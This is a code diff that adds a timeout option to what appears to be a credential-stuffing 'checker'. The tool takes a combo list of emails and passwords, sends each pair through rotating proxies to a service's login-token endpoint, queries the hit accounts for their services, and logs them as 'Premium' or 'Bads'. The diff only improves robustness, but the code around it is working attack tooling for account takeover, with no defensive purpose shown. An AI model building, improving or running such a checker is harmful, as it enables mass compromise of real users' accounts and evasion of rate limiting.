@@ -45,7 +45,8 @@ class Checker:
             combo_location,
             proxy_type,
             sort=True,
-            print_result=False
+            print_result=False,
+            timeout=None
             ):
         self.date = datetime.datetime.now().strftime("%d.%m.%Y %H-%M-%S")
         self.proxy_l = proxy_loaction
@@ -54,6 +55,7 @@ class Checker:
         self.sort = sort
         self.print_result = print_result
         self.proxy_type = proxy_type
+        self.timeout = timeout
         os.mkdir(self.date)
         self.filename_premium = open(f'./{self.date}/Premium.txt', 'a')
         self.filename_bads = open(f'./{self.date}/Bads.txt', 'a')
@@ -121,9 +123,14 @@ class Checker:
                 r = requests.post(f'https://{domain}/v1/users/tokens',
                                 headers=headers,
                                 data={'username': email, 'password': pwd},
-                                proxies={'https': f'{self.proxy_type}://{proxy}'})
+                                proxies={'https': f'{self.proxy_type}://{proxy}'},
+                                timeout=self.timeout)
             except KeyboardInterrupt:
                 return
+            except requests.exceptions.Timeout:
+                self.connection_error += 1
+                self.setConsoleTitle()
+                continue
             except requests.exceptions.ConnectionError:
                 self.connection_error += 1
                 self.setConsoleTitle()
@@ -152,9 +159,14 @@ class Checker:
                         r = requests.get(f'https://{domain}/v1/users/services',
                                         headers=headers,
                                         auth=('token', token),
-                                        proxies={'https': f'{self.proxy_type}://{proxy}'})
+                                        proxies={'https': f'{self.proxy_type}://{proxy}'},
+                                        timeout=self.timeout)
                     except KeyboardInterrupt:
                         return
+                    except requests.exceptions.Timeout:
+                        self.connection_error += 1
+                        self.setConsoleTitle()
+                        continue
                     except requests.exceptions.ConnectionError:
                         proxy = next(self.gen_proxies)
                         self.connection_error += 1
@@ -263,12 +275,18 @@ if __name__ == "__main__":
         help="Proxy type (https/socks4/socks5)",
         choices=['https', 'socks4', 'socks5'],
         required=True)
+    parser.add_argument(
+        '-to',
+        '--timeout',
+        help="Timeout in seconds",
+        required=False)
     args = vars(parser.parse_args())
     Checker(
         args['proxies'],
         args['base'],
         args['proxy_type'],
         args['sort'],
-        args['print_goods']
+        args['print_goods'],
+        args['timeout']
         ).start_threads(
         args['threads'])
